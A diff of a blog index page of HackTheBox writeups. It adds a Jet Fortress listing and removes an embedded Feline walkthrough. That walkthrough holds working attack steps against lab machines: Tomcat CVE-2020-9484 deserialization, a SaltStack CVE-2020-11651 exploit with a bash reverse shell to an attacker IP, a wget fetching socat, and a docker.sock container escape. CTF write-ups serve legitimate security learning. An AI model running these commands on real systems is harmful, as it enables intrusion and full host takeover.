@@ -103,6 +103,71 @@
 	   
 	<div class="article-header">
 	    
+		<a  class="title" href="/2020/09/21/HTB-fortress-Jet/">HTB Jet Fortress writeup</a>  
+	       
+		 
+
+		<div class='meta'>
+			<time>Sep 21, 2020</time>			
+		</div>
+	</div>
+
+
+	
+
+    
+	<div class="typo article-excerpt">	
+		
+			Active Password Protected writeup
+		  	  
+	</div>
+
+
+
+	<div class="article-categories">
+	 
+      <i class="iconfont icon-category" style="margin-right:4px"></i>
+	  	            
+				<a class="link" href="/categories/hackthebox/">hackthebox</a>           
+		            
+				<a class="link" href="/categories/hackthebox/fortress/">fortress</a>           
+		
+      
+	</div>
+	
+
+	<div class="article-tags">
+		
+			<i class="iconfont icon-tags" style="margin-right:4px"></i>
+			            
+				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
+			            
+				<a class="link" href="/tags/fortress/">fortress</a>           
+			            
+				<a class="link" href="/tags/enumeration/">enumeration</a>           
+			            
+				<a class="link" href="/tags/dns-enumeration/">dns enumeration</a>           
+			            
+				<a class="link" href="/tags/dig/">dig</a>           
+			
+		
+	</div>
+
+	<div class='article-bottom'>
+		<a class="readmore" href="/2020/09/21/HTB-fortress-Jet/">Continue</a> 	
+	</div>	
+    
+</article>
+
+	
+	
+	
+	
+
+<article class="article">		
+	   
+	<div class="article-header">
+	    
 		<a  class="title" href="/2020/09/19/HTB-fortress-akerva/">HTB Akerva Fortress writeup (Password protected)</a>  
 	       
 		 
@@ -559,161 +624,6 @@
 
 	
 	
-	
-	
-
-<article class="article">		
-	   
-	<div class="article-header">
-	    
-		<a  class="title" href="/2020/08/30/HTB-Feline/">HTB Feline Writeup</a>  
-	       
-		 
-
-		<div class='meta'>
-			<time>Aug 30, 2020</time>			
-		</div>
-	</div>
-
-
-	
-
-    
-	<div class="typo article-excerpt">	
-		 
-			<p><img src="/images/HTB-Feline-Hard/image-20200902152351473.png" alt="image-20200902152351473"></p>
-<h2 id="Author-Ikonw"><a href="#Author-Ikonw" class="headerlink" title="Author: Ikonw"></a>Author: Ikonw</h2><p>Nmap scan:</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Making a script scan on all ports</span><br><span class="line">                                                                                                       </span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-31 06:52 EDT</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.205</span><br><span class="line">Host is up (0.0066s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">8080/tcp open  http    Apache Tomcat 9.0.27</span><br><span class="line">|_http-title: VirusBucket</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 7.25 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>The web seems something related to online malware analyze? </p>
-<p>only service are available</p>
-<p>Found out script.js is loaded </p>
-<p><img src="/images/HTB-Feline-Hard/image-20200902134557499.png" alt="image-20200902134557499"></p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">let</span> photo = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;uploadFile&quot;</span>).<span class="property">files</span>[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">let</span> req = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line"><span class="keyword">let</span> email = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;email&quot;</span>).<span class="property">value</span>;</span><br><span class="line"><span class="keyword">let</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span><br><span class="line"></span><br><span class="line">formData.<span class="title function_">append</span>(<span class="string">&quot;image&quot;</span>, photo);</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/upload.jsp?email=&#x27;</span> + email , &#123; <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>, <span class="attr">body</span>: formData&#125;)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">response</span>=&gt;</span>response.<span class="title function_">text</span>())</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function"><span class="params">data</span>=&gt;</span>&#123; </span><br><span class="line">   <span class="keyword">if</span>(data.<span class="title function_">includes</span>(<span class="string">&quot;successfully&quot;</span>)) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;msg&quot;</span>).<span class="property">innerText</span> = <span class="string">&quot;Upload successful! The report will be sent via e-mail.&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;msg&quot;</span>).<span class="property">innerText</span> = <span class="string">&quot;File upload failed&quot;</span>;</span><br><span class="line">   &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">catch</span>(<span class="keyword">function</span>(<span class="params">error</span>) &#123; </span><br><span class="line">   <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;msg&quot;</span>).<span class="property">innerText</span> = <span class="string">&quot;File upload failed&quot;</span>;</span><br><span class="line">  &#125;);</span><br><span class="line">	</span><br></pre></td></tr></table></figure>
-
-<p>Not too interesting, it fetch the upload.jsp</p>
-<p>However if we upload an empty filename, it will cause the jsp to obtain an error. We found out the upload directory address <em>&#x2F;opt&#x2F;samples&#x2F;uploads</em></p>
-<p>the upload directory is not within the web directory, I have no way to execute malicious payload and execute it through URL.</p>
-<p><img src="/images/HTB-Feline-Hard/image-20200901202222343.png" alt="image-20200901202222343"></p>
-<p>After viewing the rating, it is a CVE-like Box. I don’t see any CMS or suspicious port </p>
-<p><img src="/images/HTB-Feline-Hard/image-20200902135026807.png" alt="image-20200902135026807"></p>
-<p>So I went to google about the <em>Apache Tomcat 9.0.27</em></p>
-<p>And I found <a target="_blank" rel="noopener" href="https://www.redtimmy.com/java-hacking/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/">CVE-2020-9484</a></p>
-<p>It has some prerequisites for this vulnerability</p>
-<figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line">- The persistentManager <span class="keyword">is</span> enabled <span class="keyword">and</span> <span class="keyword">it</span>&#x27;s using a *FileStore* (Not too sure <span class="keyword">if</span> this <span class="keyword">is</span> enabled)</span><br><span class="line">- The attacker <span class="keyword">is</span> able <span class="keyword">to</span> upload a <span class="built_in">file</span> <span class="keyword">with</span> arbitrary content, has control <span class="keyword">over</span> <span class="keyword">the</span> filename <span class="keyword">and</span> knows <span class="keyword">the</span> location <span class="keyword">where</span> <span class="keyword">it</span> <span class="keyword">is</span> uploaded (We know <span class="keyword">the</span> uploaded directory)</span><br><span class="line">- There are gadgets <span class="keyword">in</span> <span class="keyword">the</span> *classpath* <span class="keyword">that</span> can be used <span class="keyword">for</span> a java deserialization attack</span><br></pre></td></tr></table></figure>
-
-
-
-<p><a target="_blank" rel="noopener" href="https://github.com/masahiro331/CVE-2020-9484">Docker environment</a></p>
-<p>First, we have to generate a deserialization object session using <a target="_blank" rel="noopener" href="https://github.com/frohoff/ysoserial">ysoserial</a></p>
-<p>Do take note that, due to <em>Runtime.getRunTime().exec</em> the arguments with spaces are broken by the StringTokenizer class.</p>
-<p>We have to use base64 to encoding to reduce these issues </p>
-<p><a target="_blank" rel="noopener" href="http://www.jackson-t.ca/runtime-exec-payloads.html">Reference</a></p>
-<p><img src="/images/HTB-Feline-Hard/image-20200901215420440.png" alt="image-20200901215420440"></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~/Desktop/docker/ysoserial]</span><br><span class="line">└─<span class="comment"># java -jar ysoserial-master-6eca5bc740-1.jar CommonsCollections2 &quot;$command&quot; &gt; ~/Desktop/hackthebox/Linux/feline/xing.session        </span></span><br><span class="line">Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=<span class="literal">true</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># curl &#x27;http://10.129.6.132:8080/upload.jsp&#x27; -H &#x27;Cookie: JSESSIONID=../../../../../../../../opt/samples/uploads/xing&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>Using curl to pass the JSESSIONID and trigger the malicious session we sent. And we got the shell back.</p>
-<p><img src="/images/HTB-Feline-Hard/image-20200901220111194.png" alt="image-20200901220111194"></p>
-<p>The user flag located at <em>&#x2F;home&#x2F;tomcat&#x2F;user.txt</em></p>
-<h2 id="Root"><a href="#Root" class="headerlink" title="Root"></a>Root</h2><p>Via enumeration of network connection we found out 2 suspicious port 4506 and 4505</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">tomcat@VirusBucket:/opt/tomcat$ netstat -ntlp</span><br><span class="line">netstat -ntlp</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 127.0.0.1:4505          0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 127.0.0.1:4506          0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp        0      0 127.0.0.1:33443         0.0.0.0:*               LISTEN      -                   </span><br><span class="line">tcp6       0      0 :::8080                 :::*                    LISTEN      975/java            </span><br><span class="line">tcp6       0      0 :::22                   :::*                    LISTEN      -                   </span><br><span class="line">tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN      975/java            </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>After google we found it’s <em>saltstack</em></p>
-<p><a target="_blank" rel="noopener" href="https://gist.github.com/SwitHak/8e7fa45b5656c691ddf13c8c47e8fda6">CVE-2020-11651</a></p>
-<p>And we manage to find the CVE, after we upload the poc, we found the victim doesn’t have python3 salt module.</p>
-<p>We do a port forwarding using chisel</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/jpillora/chisel">Chisel Github</a></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Client&gt;&gt;  ./chisel_linux client &lt;your ip&gt;:&lt;Port&gt; -R:4506:127.0.0.1:4506</span><br><span class="line">Server&gt;&gt;  ./chisel_linux server -p &lt;Port&gt; --reverse</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/HTB-Feline-Hard/image-20200902142929771.png" alt="image-20200902142929771"></p>
-<p>Now we have the target port 4506 forward to our port 7777</p>
-<p>Run the POC and execute the bash reverse shell command. And we got the shell back</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 cve_2020-11651.py --<span class="built_in">exec</span> <span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.16/1234 0&gt;&amp;1&quot;&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/HTB-Feline-Hard/image-20200902143247467.png" alt="image-20200902143247467"></p>
-<p>However we didnt root the box just so easy. We have the escape the docker environment, get to the host.</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@2d24bf61767c:~<span class="comment"># cat todo.txt</span></span><br><span class="line"><span class="built_in">cat</span> todo.txt</span><br><span class="line">- Add saltstack support to auto-spawn sandbox dockers through events.</span><br><span class="line">- Integrate changes to tomcat and make the service open to public.</span><br></pre></td></tr></table></figure>
-
-
-
-<p>After some enumeration, at the <em>.bash_history</em></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> todo.txt </span><br><span class="line"><span class="built_in">printf</span> -- <span class="string">&#x27;- Add saltstack support to auto-spawn sandbox dockers through events.\n- Integrate changes to tomcat and make the service open to public.\n&#x27;</span> &gt; todo.txt</span><br><span class="line"><span class="built_in">cd</span> /home/tomcat</span><br><span class="line"><span class="built_in">cat</span> /etc/passwd</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"><span class="built_in">cd</span> /root/</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cat</span> todo.txt </span><br><span class="line"><span class="built_in">ls</span> -la /var/run/</span><br><span class="line">curl -s --unix-socket /var/run/docker.sock http://localhost/images/json</span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p><em>&#x2F;var&#x2F;run&#x2F;docker.sock</em> is used in this case.</p>
-<blockquote>
-<p><em>docker.sock</em> is a unix socket of docker daemon listens on default, it can be used to communicate with the daemon from within a container.</p>
-</blockquote>
-<p>We are allow to send commands through the docker.sock to the docker daemon though API.</p>
-<p>that means, we can create a new docker which volume bind to the whole host folder and execute malicious commands.</p>
-<p><a target="_blank" rel="noopener" href="https://blog.secureideas.com/2018/05/escaping-the-whale-things-you-probably-shouldnt-do-with-docker-part-1.html">Escaping the Whale: Things you probably shouldn’t do with Docker (Part 1)</a></p>
-<p>According the reference, first we have to get the current docker image</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -XGET --unix-socket /var/run/docker.sock http://localhost/containers/json</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;Id&quot;</span><span class="punctuation">:</span><span class="string">&quot;2d24bf61767ce2a7a78e842ebc7534db8eb1ea5a5ec21bb735e472332b8f9ca2&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Names&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">         <span class="string">&quot;/saltstack&quot;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Image&quot;</span><span class="punctuation">:</span><span class="string">&quot;188a2704d8b0&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;ImageID&quot;</span><span class="punctuation">:</span><span class="string">&quot;sha256:188a2704d8b01d4591334d8b5ed86892f56bfe1c68bee828edc2998fb015b9e9&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Command&quot;</span><span class="punctuation">:</span><span class="string">&quot;/usr/bin/dumb-init /usr/local/bin/saltinit&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Created&quot;</span><span class="punctuation">:</span><span class="number">1593520419</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Ports&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">         <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;IP&quot;</span><span class="punctuation">:</span><span class="string">&quot;127.0.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;PrivatePort&quot;</span><span class="punctuation">:</span><span class="number">4505</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;PublicPort&quot;</span><span class="punctuation">:</span><span class="number">4505</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span><span class="string">&quot;tcp&quot;</span></span><br><span class="line">         <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">         <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;IP&quot;</span><span class="punctuation">:</span><span class="string">&quot;127.0.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;PrivatePort&quot;</span><span class="punctuation">:</span><span class="number">4506</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;PublicPort&quot;</span><span class="punctuation">:</span><span class="number">4506</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span><span class="string">&quot;tcp&quot;</span></span><br><span class="line">         <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">         <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;IP&quot;</span><span class="punctuation">:</span><span class="string">&quot;127.0.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;PrivatePort&quot;</span><span class="punctuation">:</span><span class="number">8000</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;PublicPort&quot;</span><span class="punctuation">:</span><span class="number">8000</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span><span class="string">&quot;tcp&quot;</span></span><br><span class="line">         <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">         <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;PrivatePort&quot;</span><span class="punctuation">:</span><span class="number">22</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span><span class="string">&quot;tcp&quot;</span></span><br><span class="line">         <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Labels&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">         </span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;State&quot;</span><span class="punctuation">:</span><span class="string">&quot;running&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Status&quot;</span><span class="punctuation">:</span><span class="string">&quot;Up 13 hours&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;HostConfig&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">         <span class="attr">&quot;NetworkMode&quot;</span><span class="punctuation">:</span><span class="string">&quot;default&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;NetworkSettings&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">         <span class="attr">&quot;Networks&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;bridge&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">               <span class="attr">&quot;IPAMConfig&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">               <span class="attr">&quot;Links&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">               <span class="attr">&quot;Aliases&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span><span class="punctuation">,</span></span><br><span class="line">               <span class="attr">&quot;NetworkID&quot;</span><span class="punctuation">:</span><span class="string">&quot;c344406a0931eb00e8d81114b992959ed104064affada4bc6932702e39c45141&quot;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="attr">&quot;EndpointID&quot;</span><span class="punctuation">:</span><span class="string">&quot;a5e320e6a582086035e03f58b570d922c3c7c8be7f782222b47f7421b9bca4e5&quot;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="attr">&quot;Gateway&quot;</span><span class="punctuation">:</span><span class="string">&quot;172.17.0.1&quot;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="attr">&quot;IPAddress&quot;</span><span class="punctuation">:</span><span class="string">&quot;172.17.0.2&quot;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="attr">&quot;IPPrefixLen&quot;</span><span class="punctuation">:</span><span class="number">16</span><span class="punctuation">,</span></span><br><span class="line">               <span class="attr">&quot;IPv6Gateway&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="attr">&quot;GlobalIPv6Address&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="attr">&quot;GlobalIPv6PrefixLen&quot;</span><span class="punctuation">:</span><span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">               <span class="attr">&quot;MacAddress&quot;</span><span class="punctuation">:</span><span class="string">&quot;02:42:ac:11:00:02&quot;</span><span class="punctuation">,</span></span><br><span class="line">               <span class="attr">&quot;DriverOpts&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">null</span></span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">         <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;Mounts&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span></span><br><span class="line">         <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Type&quot;</span><span class="punctuation">:</span><span class="string">&quot;bind&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Source&quot;</span><span class="punctuation">:</span><span class="string">&quot;/var/run/docker.sock&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Destination&quot;</span><span class="punctuation">:</span><span class="string">&quot;/var/run/docker.sock&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Mode&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;RW&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Propagation&quot;</span><span class="punctuation">:</span><span class="string">&quot;rprivate&quot;</span></span><br><span class="line">         <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">   <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>
-
-<p>Now we have the docker image name</p>
-<p>Let’s create a json configuration file</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&#x27;&#123;&quot;Image&quot;:&quot;188a2704d8b0&quot;,&quot;Cmd&quot;:[&quot;/bin/sh&quot;],&quot;DetachKeys&quot;:&quot;Ctrl-p,Ctrl-q&quot;,&quot;OpenStdin&quot;:true,&quot;Mounts&quot;:[&#123;&quot;Type&quot;:&quot;bind&quot;,&quot;Source&quot;:&quot;/root&quot;,&quot;Target&quot;:&quot;/host_etc&quot;&#125;]&#125;&#x27;</span> &gt; container.json</span><br></pre></td></tr></table></figure>
-
-<p>and we create the image using the container.json configuration file</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -XPOST -H <span class="string">&quot;Content-Type: application/json&quot;</span> --unix-socket /var/run/docker.sock -d <span class="string">&quot;<span class="subst">$(cat container.json)</span>&quot;</span> http://localhost/containers/create</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/HTB-Feline-Hard/image-20200902145656343.png" alt="image-20200902145656343"></p>
-<p>Next start our malicious container</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/2aba/start</span><br></pre></td></tr></table></figure>
-
-<p>replace the <em>32d862</em> to the image id your created</p>
-<p>after start the docker,use socat connect to the docker socket, however the machine doesnt have socat, we have to upload our own socat binary</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@2d24bf61767c:~<span class="comment"># which wget</span></span><br><span class="line"><span class="built_in">which</span> wget</span><br><span class="line">/usr/bin/wget</span><br><span class="line">root@2d24bf61767c:~<span class="comment"># which socat</span></span><br><span class="line"><span class="built_in">which</span> socat</span><br><span class="line">root@2d24bf61767c:~<span class="comment"># ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">todo.txt</span><br><span class="line">root@2d24bf61767c:~<span class="comment"># wget 10.10.14.16:1337/socat</span></span><br><span class="line">wget 10.10.14.16:1337/socat</span><br><span class="line">--2020-09-02 07:14:12--  http://10.10.14.16:1337/socat</span><br><span class="line">Connecting to 10.10.14.16:1337... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 375176 (366K) [application/octet-stream]</span><br><span class="line">Saving to: ‘socat’</span><br><span class="line"></span><br><span class="line">     0K .......... .......... .......... .......... .......... 13% 2.99M 0s</span><br><span class="line">    50K .......... .......... .......... .......... .......... 27% 6.38M 0s</span><br><span class="line">   100K .......... .......... .......... .......... .......... 40% 32.3M 0s</span><br><span class="line">   150K .......... .......... .......... .......... .......... 54% 7.64M 0s</span><br><span class="line">   200K .......... .......... .......... .......... .......... 68% 12.8M 0s</span><br><span class="line">   250K .......... .......... .......... .......... .......... 81% 6.75M 0s</span><br><span class="line">   300K .......... .......... .......... .......... .......... 95%  522K 0s</span><br><span class="line">   350K .......... ......                                     100%  135M=0.1s</span><br><span class="line"></span><br><span class="line">2020-09-02 07:14:12 (2.58 MB/s) - ‘socat’ saved [375176/375176]</span><br><span class="line"></span><br><span class="line">root@2d24bf61767c:~<span class="comment"># chmod +x socat</span></span><br><span class="line"><span class="built_in">chmod</span> +x socat</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">socat - UNIX-CONNECT:/var/run/docker.sock</span><br><span class="line"></span><br><span class="line"><span class="keyword">POST</span> <span class="string">/containers/2aba/attach?stream=1&amp;stdin=1&amp;stdout=1&amp;stderr=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span>:</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Upgrade</span><br><span class="line"><span class="attribute">Upgrade</span><span class="punctuation">: </span>tcp</span><br></pre></td></tr></table></figure>
-
-<p>and if it sucess, we receive </p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">101</span> UPGRADED</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/vnd.docker.raw-stream</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Upgrade</span><br><span class="line"><span class="attribute">Upgrade</span><span class="punctuation">: </span>tcp</span><br></pre></td></tr></table></figure>
-
-<p>and we are able to access the folder and get the root flag now.</p>
-<br/>
-<br/>
-<br/>
-
-<p><img src="/images/root.gif" alt="root"></p>
-
-		  	  
-	</div>
-
-
-
-	<div class="article-categories">
-	 
-      <i class="iconfont icon-category" style="margin-right:4px"></i>
-	  	            
-				<a class="link" href="/categories/HackTheBox-Hard/">HackTheBox-Hard</a>           
-		
-      
-	</div>
-	
-
-	<div class="article-tags">
-		
-			<i class="iconfont icon-tags" style="margin-right:4px"></i>
-			            
-				<a class="link" href="/tags/hackthebox/">hackthebox</a>           
-			            
-				<a class="link" href="/tags/hard/">hard</a>           
-			
-		
-	</div>
-
-	<div class='article-bottom'>
-		<a class="readmore" href="/2020/08/30/HTB-Feline/">Continue</a> 	
-	</div>	
-    
-</article>
-
-	
-	
 
 	
 	
@@ -726,7 +636,7 @@
         </a>
     
 
-   <span class="page-number"> Page <strong>3</strong>, Posts <strong>28</strong>. </span>
+   <span class="page-number"> Page <strong>3</strong>, Posts <strong>29</strong>. </span>
 
     
         <a class="next" href="/page/4/"> 
